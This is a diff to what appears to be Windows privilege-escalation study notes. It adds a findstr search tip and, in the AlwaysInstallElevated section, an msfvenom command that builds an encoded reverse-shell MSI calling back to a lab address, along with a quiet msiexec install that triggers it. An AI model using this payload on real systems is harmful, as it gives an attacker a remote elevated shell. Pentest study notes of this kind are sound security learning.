@@ -171,6 +171,11 @@ Use:
 - Use `date` to show data
 - Use `time` to show time
 
+### Using findstr to find a word in files 
+
+- Use `findstr /S /C:"[word]" *.[filetype]
+
+![image](https://github.com/user-attachments/assets/56c6792e-a0e0-48aa-846f-8dd1ccc9a2a3)
  
 ------------------------------
 
@@ -384,6 +389,11 @@ When this registry key is enabled, it allows non-administrator users to install 
 
 ![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)
 
+- Generate `msi` with msfvenow syntax below-:
+
+```bash
+msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
+```
 - Copy the msi payload and install with msiexec to trigger a reverse shelll
 
       msiexec /quiet /qn /i [msi's path]
